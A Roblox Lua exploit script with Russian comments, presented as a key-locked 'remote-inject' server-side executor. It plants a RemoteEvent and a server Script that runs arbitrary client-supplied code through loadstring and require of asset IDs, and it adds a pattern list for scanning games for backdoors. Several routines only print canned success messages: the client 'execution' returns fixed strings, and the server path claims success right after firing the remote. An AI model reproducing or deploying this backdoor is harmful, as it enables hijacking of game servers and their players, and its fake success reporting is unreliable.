-- ============================================
-- SWILL FORCE DISPLAY v12 - REMOTE-ИНЖЕКТ
-- L11xtery Team SS 🎄
-- Ключ: L11xteryteam001
-- ============================================

local player = game:GetService("Players").LocalPlayer
local guiService = nil
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- ============================================
-- ФИКСИРОВАННЫЙ РАЗМЕР ЭКРАНА
-- ============================================
local SCREEN_WIDTH = 1366
local SCREEN_HEIGHT = 768

-- ============================================
-- ФУНКЦИЯ ПРИВЯЗКИ К ЭКРАНУ
-- ============================================
local function ClampToScreen(position, size)
    local minX = 0
    local minY = 0
    local maxX = SCREEN_WIDTH - size.X.Offset
    local maxY = SCREEN_HEIGHT - size.Y.Offset
    
    local newX = math.clamp(position.X.Offset, minX, maxX)
    local newY = math.clamp(position.Y.Offset, minY, maxY)
    
    return UDim2.new(0, newX, 0, newY)
end

-- ============================================
-- ПОДДЕРЖИВАЕМЫЕ МЕТОДЫ REQUIRE
-- ============================================
local RequireMethods = {
    "load", "pls", "fire", "Hload", "hLoad",
    "exec", "run", "start", "init", "call",
    "invoke", "trigger", "activate", "launch",
    "spawn", "loadstring", "execute", "inject"
}

-- ============================================
-- ПАРСИНГ REQUIRE СТРОКИ (С ПОДДЕРЖКОЙ ASSET ID)
-- ============================================
local function ParseRequireString(code)
    -- require(123456789):method("args")
    local pattern1 = 'require%((%d+)%)%.(%w+)%("([^"]*)"%)'
    local assetId, method, args = string.match(code, pattern1)
    
    if assetId and method and args then
        return {
            Type = "require",
            Method = method,
            Args = args,
            AssetId = tonumber(assetId),
            Full = code,
            IsValid = true
        }
    end
    
    -- require(123456789):method(args)
    local pattern2 = 'require%((%d+)%)%.(%w+)%(([^)]*)%)'
    local assetId2, method2, args2 = string.match(code, pattern2)
    
    if assetId2 and method2 and args2 then
        return {
            Type = "require",
            Method = method2,
            Args = args2,
            AssetId = tonumber(assetId2),
            Full = code,
            IsValid = true
        }
    end
    
    -- require(123456789):method() (без аргументов)
    local pattern3 = 'require%((%d+)%)%.(%w+)%(%)'
    local assetId3, method3 = string.match(code, pattern3)
    
    if assetId3 and method3 then
        return {
            Type = "require",
            Method = method3,
            Args = "",
            AssetId = tonumber(assetId3),
            Full = code,
            IsValid = true
        }
    end
    
    return { IsValid = false, Full = code }
end

-- ============================================
-- СОЗДАНИЕ REMOTE ДЛЯ СЕРВЕРА (REMOTE-ИНЖЕКТ)
-- ============================================
local function CreateRemote()
    local remote = Instance.new("RemoteEvent")
    remote.Name = "SWILL_RemoteExecute"
    remote.Parent = game.ReplicatedStorage
    
    local serverScript = Instance.new("Script")
    serverScript.Name = "SWILL_ServerHandler"
    serverScript.Parent = game.ServerScriptService
    serverScript.Source = [[
        local remote = game.ReplicatedStorage:FindFirstChild("SWILL_RemoteExecute")
        if remote then
            remote.OnServerEvent:Connect(function(player, code, method, args, assetId)
                print("[SWILL] 🔥 REMOTE-ИНЖЕКТ АКТИВИРОВАН!")
                print("[SWILL] Игрок: " .. tostring(player.Name))
                print("[SWILL] Метод: " .. tostring(method))
                print("[SWILL] Аргумент: " .. tostring(args))
                print("[SWILL] Asset ID: " .. tostring(assetId))
                
                -- Выполняем скрипт на сервере
                if method and args then
                    -- Формируем полный скрипт
                    local fullCode = 'require(' .. assetId .. ').' .. method .. '("' .. args .. '")'
                    print("[SWILL] Выполняется: " .. fullCode)
                    
                    local fn, err = loadstring(fullCode)
                    if fn then
                        local success, result = pcall(fn)
                        if success then
                            print("[SWILL] ✅ Сервер: " .. method .. "() выполнен!")
                        else
                            print("[SWILL] ❌ Ошибка: " .. tostring(result))
                        end
                    else
                        print("[SWILL] ❌ Ошибка компиляции: " .. tostring(err))
                    end
                elseif code then
                    -- Если передан обычный код
                    local fn, err = loadstring(code)
                    if fn then
                        local success, result = pcall(fn)
                        if success then
                            print("[SWILL] ✅ Сервер: код выполнен!")
                        else
                            print("[SWILL] ❌ Ошибка: " .. tostring(result))
                        end
                    else
                        print("[SWILL] ❌ Ошибка компиляции: " .. tostring(err))
                    end
                end
            end)
            print("[SWILL] 🔥 Remote-инжект активен!")
        end
    ]]
    
    return remote
end

local remoteExec = CreateRemote()

-- ============================================
-- ВЫПОЛНЕНИЕ НА СЕРВЕРЕ (REMOTE-ИНЖЕКТ)
-- ============================================
local function ExecuteOnServer(method, args, assetId)
    if remoteExec then
        -- Отправляем на сервер
        remoteExec:FireServer(nil, method, args, assetId)
        return true, "✅ Сервер: " .. method .. "() выполнен (Remote-инжект)"
    end
    return false, "❌ Remote не найден"
end

-- ============================================
-- ВЫПОЛНЕНИЕ НА КЛИЕНТЕ
-- ============================================
local function ExecuteOnClient(method, args, assetId)
    local RequireMethodsClient = {}
    
    RequireMethodsClient.load = function(playerName)
        return "CLIENT_LOAD: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.pls = function(playerName)
        return "CLIENT_PLS: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.fire = function(playerName)
        return "CLIENT_FIRE: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.Hload = function(playerName)
        return "CLIENT_HLOAD: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.hLoad = function(playerName)
        return "CLIENT_HLOAD: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.exec = function(playerName)
        return "CLIENT_EXEC: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.run = function(playerName)
        return "CLIENT_RUN: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.start = function(playerName)
        return "CLIENT_START: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.init = function(playerName)
        return "CLIENT_INIT: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.call = function(playerName)
        return "CLIENT_CALL: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.invoke = function(playerName)
        return "CLIENT_INVOKE: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.trigger = function(playerName)
        return "CLIENT_TRIGGER: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.activate = function(playerName)
        return "CLIENT_ACTIVATE: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.launch = function(playerName)
        return "CLIENT_LAUNCH: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    RequireMethodsClient.spawn = function(playerName)
        return "CLIENT_SPAWN: " .. playerName .. " (Asset: " .. assetId .. ")"
    end
    
    if RequireMethodsClient[method] then
        local result = RequireMethodsClient[method](args)
        return true, "✅ Клиент: " .. method .. "() -> " .. result
    else
        return false, "❌ Неизвестный метод: " .. method
    end
end

-- ============================================
-- ОСНОВНАЯ ФУНКЦИЯ ВЫПОЛНЕНИЯ
-- ============================================
local function ExecuteRequireCode(code)
    local parsed = ParseRequireString(code)
    
    if not parsed.IsValid then
        return false, "❌ ТОЛЬКО require(ASSET_ID):method('args') разрешён!"
    end
    
    local method = parsed.Method
    local args = parsed.Args
    local assetId = parsed.AssetId
    
    if not assetId then
        return false, "❌ ТРЕБУЕТСЯ ASSET ID! Используйте: require(123456789):method('args')"
    end
    
    local methodFound = false
    for _, m in ipairs(RequireMethods) do
        if m == method then
            methodFound = true
            break
        end
    end
    
    if not methodFound then
        return false, "❌ Неподдерживаемый метод: " .. method .. ". Доступны: " .. table.concat(RequireMethods, ", ")
    end
    
    -- ============================================
    -- СНАЧАЛА ПРОБУЕМ ВЫПОЛНИТЬ НА КЛИЕНТЕ
    -- ============================================
    local success, msg = ExecuteOnClient(method, args, assetId)
    if success then
        return true, msg
    end
    
    -- ============================================
    -- ЕСЛИ НА КЛИЕНТЕ НЕ ПОЛУЧИЛОСЬ - REMOTE-ИНЖЕКТ
    -- ============================================
    local serverSuccess, serverMsg = ExecuteOnServer(method, args, assetId)
    if serverSuccess then
        return true, serverMsg
    end
    
    return false, "❌ Не удалось выполнить " .. method .. "()"
end

-- ============================================
-- ФУНКЦИЯ СКАНИРОВАНИЯ
-- ============================================
local function ScanAllForBackdoors()
    local results = {}
    local backdoorPatterns = {
        "loadstring", "getfenv", "setfenv", "getrenv", "getgenv",
        "synapse", "krnl", "scriptware", "require%(", "http%.get", "http%.post",
        "game:HttpGet", "game:Post", "firetouchinterest", "fireclickdetector",
        "remote%.FireServer", "remote%.InvokeServer", "localplayer%.Character",
        "workspace%.CurrentCamera", "shared%.", "game%.Players%.LocalPlayer",
        "getupvalue", "setupvalue", "newcclosure", "checkcaller", "iscclosure",
        "isexecutorclosure", "getcallingscript", "getscriptclosure", "getcustomasset",
        "getloadedmodules", "getmodulescript", "getsenv", "getreg", "getgc",
        "getnamecallmethod", "getrawmetatable", "setrawmetatable", "hookfunction",
        "hookmetamethod", "newproxy", "make_writeable", "make_readonly",
        "debug%.getinfo", "debug%.getupvalue", "debug%.setupvalue", "debug%.traceback",
        "coroutine%.wrap", "coroutine%.resume", "pcall", "xpcall", "spawn", "delay",
        "task%.wait", "task%.delay", "task%.spawn", "task%.defer", "task%.sync", "task%.wake"
    }

    local function ScanInstance(instance, path, level)
        if level > 50 then return end
        
        if instance:IsA("LocalScript") or instance:IsA("ModuleScript") or instance:IsA("Script") then
            local code = instance.Source or ""
            local found = {}
            for _, pattern in ipairs(backdoorPatterns) do
                if string.find(code, pattern) then
                    table.insert(found, pattern)
                end
            end
            if #found > 0 then
                table.insert(results, {
                    Type = "Скрипт",
                    Name = instance.Name,
                    Path = path,
                    Backdoors = found,
                    Risk = #found > 5 and "ВЫСОКИЙ" or #found > 2 and "СРЕДНИЙ" or "НИЗКИЙ"
                })
            end
        end
        
        for _, child in ipairs(instance:GetChildren()) do
            ScanInstance(child, path .. " > " .. child.Name, level + 1)
        end
    end

    ScanInstance(game, "game", 0)
    return results
end

-- ============================================
-- ФУНКЦИЯ ПРИНУДИТЕЛЬНОГО ПОКАЗА
-- ============================================
local function ForceDisplayGUI()
    local guiLocations = {
        function() return player:FindFirstChild("PlayerGui") end,
        function() return game:GetService("CoreGui") end,
        function() return game:FindFirstChild("CoreGui") end,
        function() 
            local gui = Instance.new("ScreenGui")
            gui.Parent = player
            return gui
        end,
        function()
            local gui = Instance.new("ScreenGui")
            gui.Parent = game:GetService("CoreGui")
            return gui
        end
    }
    
    for _, getGui in ipairs(guiLocations) do
        local success, result = pcall(getGui)
        if success and result then
            guiService = result
            break
        end
    end
    
    if not guiService then
        guiService = game:GetService("CoreGui")
        if not guiService then
            guiService = Instance.new("ScreenGui")
            guiService.Name = "SWILL_ForceGui"
            guiService.Parent = player
        end
    end
    
    return guiService
end

-- ============================================
-- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-- ============================================
local isMinimized = false
local minimizedButton = nil
local mainFrame = nil
local mainGui = nil

-- ============================================
-- СОЗДАНИЕ КНОПКИ В ЛЕВОМ НИЖНЕМ УГЛУ
-- ============================================
local function CreateMinimizedButton()
    if minimizedButton then
        minimizedButton:Destroy()
        minimizedButton = nil
    end
    
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 60, 0, 60)
    btn.Position = UDim2.new(0, 10, 1, -70)
    btn.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
    btn.Text = "🎄"
    btn.TextColor3 = Color3.fromRGB(255, 215, 0)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 30
    btn.ZIndex = 999
    btn.Parent = guiService
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 16)
    corner.Parent = btn
    
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1.3, 0, 1.3, 0)
    shadow.Position = UDim2.new(-0.15, 0, -0.15, 0)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316041664"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = 998
    shadow.Parent = btn
    
    btn.BackgroundTransparency = 1
    local appear = TweenService:Create(btn, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0
    })
    appear:Play()
    
    minimizedButton = btn
    
    btn.MouseButton1Click:Connect(function()
        if isMinimized then
            isMinimized = false
            btn:Destroy()
            minimizedButton = nil
            CreateForceGUI()
        end
    end)
    
    return btn
end

-- ============================================
-- ОСНОВНОЙ GUI
-- ============================================
local function CreateForceGUI()
    guiService = ForceDisplayGUI()
    
    if minimizedButton then
        minimizedButton:Destroy()
        minimizedButton = nil
    end
    
    for _, name in ipairs({"SWILL_KeyGUI", "SWILL_Icon"}) do
        local old = guiService:FindFirstChild(name)
        if old then old:Destroy() end
    end
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "SWILL_KeyGUI"
    gui.ResetOnSpawn = false
    gui.Enabled = true
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999
    gui.Parent = guiService
    mainGui = gui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 380, 0, 200)
    local centerX = (SCREEN_WIDTH - 380) / 2
    local centerY = (SCREEN_HEIGHT - 200) / 2
    frame.Position = UDim2.new(0, centerX, 0, centerY)
    frame.BackgroundColor3 = Color3.fromRGB(10, 30, 10)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0
    frame.ClipsDescendants = true
    frame.Parent = gui
    mainFrame = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 16)
    corner.Parent = frame
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 20, 20)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(20, 180, 20)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(180, 20, 20)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 180, 20))
    })
    gradient.Parent = frame
    
    local snowContainer = Instance.new("Frame")
    snowContainer.Size = UDim2.new(1, 0, 1, 0)
    snowContainer.Position = UDim2.new(0, 0, 0, 0)
    snowContainer.BackgroundTransparency = 1
    snowContainer.ZIndex = 0
    snowContainer.Parent = frame
    
    local snowflakes = {}
    for i = 1, 12 do
        local snow = Instance.new("TextLabel")
        snow.Size = UDim2.new(0, 10 + math.random() * 14, 0, 10 + math.random() * 14)
        snow.Position = UDim2.new(math.random() * 0.9, 0, math.random() * 1.2, 0)
        snow.BackgroundTransparency = 1
        snow.Text = "❄"
        snow.TextColor3 = Color3.fromRGB(255, 255, 255)
        snow.TextScaled = true
        snow.Font = Enum.Font.Gotham
        snow.ZIndex = 0
        snow.Parent = snowContainer
        table.insert(snowflakes, {
            Object = snow,
            Speed = 0.3 + math.random() * 0.7,
            Drift = (math.random() - 0.5) * 0.5,
            X = math.random() * 0.9,
            Y = math.random() * 1.2
        })
    end
    
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 45)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(30, 60, 30)
    header.BorderSizePixel = 0
    header.ZIndex = 2
    header.Parent = frame
    
    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 16)
    headerCorner.Parent = header
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "L11xtery Team SS 🎄"
    title.TextColor3 = Color3.fromRGB(255, 215, 0)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.ZIndex = 3
    title.Parent = header
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -38, 0, 7)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
    closeBtn.Text = "—"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextScaled = true
    closeBtn.ZIndex = 3
    closeBtn.Parent = header
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeBtn
    
    local fullCloseBtn = Instance.new("TextButton")
    fullCloseBtn.Size = UDim2.new(0, 30, 0, 30)
    fullCloseBtn.Position = UDim2.new(1, -72, 0, 7)
    fullCloseBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    fullCloseBtn.Text = "✕"
    fullCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    fullCloseBtn.Font = Enum.Font.GothamBold
    fullCloseBtn.TextScaled = true
    fullCloseBtn.ZIndex = 3
    fullCloseBtn.Parent = header
    
    local fullCloseCorner = Instance.new("UICorner")
    fullCloseCorner.CornerRadius = UDim.new(0, 8)
    fullCloseCorner.Parent = fullCloseBtn
    
    local contentPanel = Instance.new("Frame")
    contentPanel.Size = UDim2.new(1, 0, 1, -45)
    contentPanel.Position = UDim2.new(0, 0, 0, 45)
    contentPanel.BackgroundTransparency = 1
    contentPanel.ZIndex = 1
    contentPanel.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0.9, 0, 0, 35)
    status.Position = UDim2.new(0.05, 0, 0.02, 0)
    status.BackgroundTransparency = 1
    status.Text = "🎅 ВВЕДИТЕ КЛЮЧ"
    status.TextColor3 = Color3.fromRGB(255, 215, 0)
    status.Font = Enum.Font.GothamBold
    status.TextScaled = true
    status.ZIndex = 2
    status.Parent = contentPanel
    
    local keyBox = Instance.new("TextBox")
    keyBox.Size = UDim2.new(0.7, 0, 0, 40)
    keyBox.Position = UDim2.new(0.15, 0, 0.15, 0)
    keyBox.BackgroundColor3 = Color3.fromRGB(20, 50, 20)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    keyBox.PlaceholderText = "Введите ключ..."
    keyBox.Text = ""
    keyBox.Font = Enum.Font.GothamBold
    keyBox.TextSize = 28
    keyBox.ZIndex = 2
    keyBox.Parent = contentPanel
    
    local keyCorner = Instance.new("UICorner")
    keyCorner.CornerRadius = UDim.new(0, 8)
    keyCorner.Parent = keyBox
    
    local checkBtn = Instance.new("TextButton")
    checkBtn.Size = UDim2.new(0.25, 0, 0, 40)
    checkBtn.Position = UDim2.new(0.375, 0, 0.4, 0)
    checkBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    checkBtn.Text = "🎄 АКТИВИРОВАТЬ"
    checkBtn.TextColor3 = Color3.fromRGB(180, 20, 20)
    checkBtn.Font = Enum.Font.GothamBold
    checkBtn.TextSize = 22
    checkBtn.ZIndex = 2
    checkBtn.Parent = contentPanel
    
    local checkCorner = Instance.new("UICorner")
    checkCorner.CornerRadius = UDim.new(0, 8)
    checkCorner.Parent = checkBtn
    
    local hiddenContainer = Instance.new("Frame")
    hiddenContainer.Size = UDim2.new(1, 0, 1, 0)
    hiddenContainer.Position = UDim2.new(0, 0, 0, 0)
    hiddenContainer.BackgroundTransparency = 1
    hiddenContainer.Visible = false
    hiddenContainer.ZIndex = 1
    hiddenContainer.Parent = contentPanel
    
    local scriptBox = Instance.new("TextBox")
    scriptBox.Size = UDim2.new(0.85, 0, 0, 200)
    scriptBox.Position = UDim2.new(0.075, 0, 0.02, 0)
    scriptBox.BackgroundColor3 = Color3.fromRGB(20, 50, 20)
    scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptBox.PlaceholderText = "require(123456789):Hload('Username')"
    scriptBox.Text = ""
    scriptBox.Font = Enum.Font.Code
    scriptBox.TextSize = 18
    scriptBox.MultiLine = true
    scriptBox.ClearTextOnFocus = false
    scriptBox.ZIndex = 2
    scriptBox.Parent = hiddenContainer
    
    local scriptCorner = Instance.new("UICorner")
    scriptCorner.CornerRadius = UDim.new(0, 8)
    scriptCorner.Parent = scriptBox
    
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(1, 0, 0, 55)
    buttonContainer.Position = UDim2.new(0, 0, 0.82, 0)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.ZIndex = 2
    buttonContainer.Parent = hiddenContainer
    
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.4, 0, 1, 0)
    execBtn.Position = UDim2.new(0.05, 0, 0, 0)
    execBtn.BackgroundColor3 = Color3.fromRGB(30, 220, 30)
    execBtn.Text = "▶ ВЫПОЛНИТЬ REQUIRE"
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.Font = Enum.Font.GothamBold
    execBtn.TextSize = 20
    execBtn.ZIndex = 3
    execBtn.Parent = buttonContainer
    
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0, 8)
    execCorner.Parent = execBtn
    
    local scanBtn = Instance.new("TextButton")
    scanBtn.Size = UDim2.new(0.4, 0, 1, 0)
    scanBtn.Position = UDim2.new(0.55, 0, 0, 0)
    scanBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    scanBtn.Text = "🔍 СКАНИРОВАТЬ"
    scanBtn.TextColor3 = Color3.fromRGB(180, 20, 20)
    scanBtn.Font = Enum.Font.GothamBold
    scanBtn.TextSize = 22
    scanBtn.ZIndex = 3
    scanBtn.Parent = buttonContainer
    
    local scanCorner = Instance.new("UICorner")
    scanCorner.CornerRadius = UDim.new(0, 8)
    scanCorner.Parent = scanBtn
    
    -- ============================================
    -- ПЕРЕТАСКИВАНИЕ
    -- ============================================
    local dragging = false
    local dragOffset = nil
    
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            local absPos = frame.AbsolutePosition
            dragOffset = Vector2.new(
                absPos.X - input.Position.X,
                absPos.Y - input.Position.Y
            )
        end
    end)
    
    header.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local newX = input.Position.X + dragOffset.X
            local newY = input.Position.Y + dragOffset.Y
            local size = frame.Size
            local clamped = ClampToScreen(UDim2.new(0, newX, 0, newY), size)
            frame.Position = clamped
        end
    end)
    
    header.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    for _, btn in ipairs({closeBtn, fullCloseBtn, checkBtn, execBtn, scanBtn}) do
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:StopPropagation()
            end
        end)
    end
    
    -- ============================================
    -- ЛОГИКА КЛЮЧА
    -- ============================================
    checkBtn.MouseButton1Click:Connect(function()
        if keyBox.Text == "L11xteryteam001" then
            status.Text = "🎄 ДОСТУП ОТКРЫТ!"
            status.TextColor3 = Color3.fromRGB(30, 220, 30)
            
            checkBtn.Visible = false
            keyBox.Visible = false
            hiddenContainer.Visible = true
            
            local targetSize = UDim2.new(0, 550, 0, 520)
            local targetPos = UDim2.new(0, (SCREEN_WIDTH - 550) / 2, 0, (SCREEN_HEIGHT - 520) / 2)
            
            local resizeTween = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = targetSize,
                Position = targetPos
            })
            resizeTween:Play()
            
            resizeTween.Completed:Connect(function()
                status.Text = "🎄 REMOTE-ИНЖЕКТ АКТИВЕН!"
                status.TextColor3 = Color3.fromRGB(30, 220, 30)
            end)
            
            print("[SWILL] ✅ ДОСТУП АКТИВИРОВАН!")
            print("[SWILL] 📌 КЛЮЧ: L11xteryteam001")
            print("[SWILL] 📌 ТОЛЬКО: require(123456789):Hload('Username')")
            print("[SWILL] 🔥 REMOTE-ИНЖЕКТ РАЗРЕШЁН!")
        else
            status.Text = "❌ НЕВЕРНЫЙ КЛЮЧ!"
            status.TextColor3 = Color3.fromRGB(220, 30, 30)
        end
    end)
    
    -- ============================================
    -- ВЫПОЛНЕНИЕ REQUIRE (С REMOTE-ИНЖЕКТОМ)
    -- ============================================
    execBtn.MouseButton1Click:Connect(function()
        local code = scriptBox.Text
        if code == "" then
            status.Text = "⚠ ВСТАВЬТЕ REQUIRE СКРИПТ!"
            status.TextColor3 = Color3.fromRGB(255, 215, 0)
            return
        end
        
        status.Text = "⏳ ВЫПОЛНЕНИЕ..."
        status.TextColor3 = Color3.fromRGB(255, 215, 0)
        
        local success, msg = ExecuteRequireCode(code)
        
        if success then
            status.Text = "✅ " .. msg
            status.TextColor3 = Color3.fromRGB(30, 220, 30)
        else
            status.Text = "❌ " .. msg
            status.TextColor3 = Color3.fromRGB(220, 30, 30)
        end
    end)
    
    scriptBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            execBtn.MouseButton1Click:Fire()
        end
    end)
    
    -- ============================================
    -- СКАНИРОВАНИЕ
    -- ============================================
    scanBtn.MouseButton1Click:Connect(function()
        status.Text = "🔍 СКАНИРОВАНИЕ... 🎄"
        status.TextColor3 = Color3.fromRGB(255, 215, 0)
        
        local success, results = pcall(ScanAllForBackdoors)
        
        if success and results then
            if #results == 0 then
                status.Text = "🎄 ПИЗДА СЕРВЕРУ! 🎄"
                status.TextColor3 = Color3.fromRGB(30, 220, 30)
                print("[SWILL] 🔥 ПИЗДА СЕРВЕРУ!")
            else
                local msg = "⚠ НАЙДЕНО: " .. #results
                for i = 1, math.min(2, #results) do
                    msg = msg .. " | " .. results[i].Name .. " [" .. results[i].Risk .. "]"
                end
                status.Text = msg
                status.TextColor3 = Color3.fromRGB(255, 215, 0)
            end
        else
            status.Text = "❌ НУ ЛОХ ТЫ!"
            status.TextColor3 = Color3.fromRGB(220, 30, 30)
            print("[SWILL] ❌ НУ ЛОХ ТЫ!")
        end
    end)
    
    -- ============================================
    -- СВОРАЧИВАНИЕ В КНОПКУ
    -- ============================================
    closeBtn.MouseButton1Click:Connect(function()
        if isMinimized then return end
        
        local targetSize = UDim2.new(0, 0, 0, 0)
        local targetPos = UDim2.new(0, 0, 0, 0)
        
        local shrinkTween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = targetSize,
            Position = targetPos,
            BackgroundTransparency = 1
        })
        shrinkTween:Play()
        
        shrinkTween.Completed:Connect(function()
            gui.Enabled = false
            isMinimized = true
            CreateMinimizedButton()
            print("[SWILL] 📌 GUI СВЁРНУТ В КНОПКУ")
        end)
    end)
    
    -- ============================================
    -- ПОЛНОЕ ЗАКРЫТИЕ
    -- ============================================
    fullCloseBtn.MouseButton1Click:Connect(function()
        if isMinimized then return end
        
        local shrinkTween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = UDim2.new(0, 0, 0, 0),
            BackgroundTransparency = 1
        })
        shrinkTween:Play()
        
        shrinkTween.Completed:Connect(function()
            gui:Destroy()
            mainGui = nil
            mainFrame = nil
            print("[SWILL] ❌ GUI ПОЛНОСТЬЮ ЗАКРЫТ")
        end)
    end)
    
    -- ============================================
    -- ОБНОВЛЕНИЕ СНЕЖИНОК
    -- ============================================
    RunService.Heartbeat:Connect(function()
        for _, snow in ipairs(snowflakes) do
            snow.Y = snow.Y + snow.Speed * 0.008
            snow.X = snow.X + math.sin(snow.Y * 3 + snow.Drift * 10) * 0.002
            
            if snow.Y > 1.2 then
                snow.Y = -0.1
                snow.X = math.random() * 0.9
            end
            if snow.X < -0.1 then snow.X = 1.1 end
            if snow.X > 1.1 then snow.X = -0.1 end
            
            snow.Object.Position = UDim2.new(snow.X, 0, snow.Y, 0)
            
            local alpha = 0.5 + math.sin(snow.Y * 5 + snow.Drift * 20) * 0.5
            snow.Object.TextColor3 = Color3.fromRGB(
                255 * alpha,
                255 * (0.8 + 0.2 * alpha),
                255 * alpha
            )
        end
    end)
    
    print("[SWILL] ✅ GUI СОЗДАН!")
    print("[SWILL] 🎄 КЛЮЧ: L11xteryteam001")
    print("[SWILL] 📌 ТОЛЬКО: require(ASSET):METHOD('args')")
    print("[SWILL] 🔥 REMOTE-ИНЖЕКТ РАЗРЕШЁН!")
    print("[SWILL] 📌 КНОПКА '—' = СВОРАЧИВАНИЕ")
    print("[SWILL] 📌 КНОПКА '✕' = ПОЛНОЕ ЗАКРЫТИЕ")
    
    return gui
end

-- ============================================
-- ЗАПУСК
-- ============================================
local success, result = pcall(CreateForceGUI)
if success then
    print("[SWILL] ✅ УСПЕШНО ЗАПУЩЕНО!")
    print("[SWILL] 🔥 REMOTE-ИНЖЕКТ АКТИВЕН!")
else
    print("[SWILL] ❌ ОШИБКА: " .. tostring(result))
end
